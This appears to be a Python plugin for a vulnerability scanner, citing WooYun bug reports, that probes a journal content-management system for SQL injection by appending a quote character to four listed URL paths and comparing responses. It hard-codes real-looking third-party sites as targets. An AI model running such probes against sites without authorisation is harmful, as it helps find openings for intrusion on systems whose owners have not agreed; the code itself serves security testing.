#!/usr/bin/env python
# -*- coding: utf-8 -*-
#author:小光
#refer:http://www.wooyun.org/bugs/wooyun-2010-080467
#refer:http://www.wooyun.org/bugs/wooyun-2010-083812
#refer:http://www.wooyun.org/bugs/wooyun-2010-083817
#refer:http://www.wooyun.org/bugs/wooyun-2010-083852

def assign(service, arg):
    if service == "jienuohan":
        return True, arg
              
def audit(arg):
     
    payloads = [
        'CommonPage.aspx?Id=13',
        'web/ViewAbstract.aspx?GaoHao=1',
        'Tougao/UserEdit.aspx?IsAdd=1&type=1&IsTop=1',
        'tougao/GetInfo.aspx?type=getwkqi&value=1',
        ]
    getdata = '%27%'
    for payload in payloads:
        url = arg + payload
        code1, head, res1, errcode, _ = curl.curl2(url)
        code2, head, res2, errcode, _ = curl.curl2(url+'%27')
        if code1==200 and code2==200 and (res2!=res1):
            security_hole(arg+payload+": found sql Injection")



if __name__ == '__main__':
    from dummy import *
    audit(assign('jienuohan','http://xnxyxb.cnmanu.cn/')[1])
    #audit(assign('jienuohan','http://www.lcjsyx.com/')[1])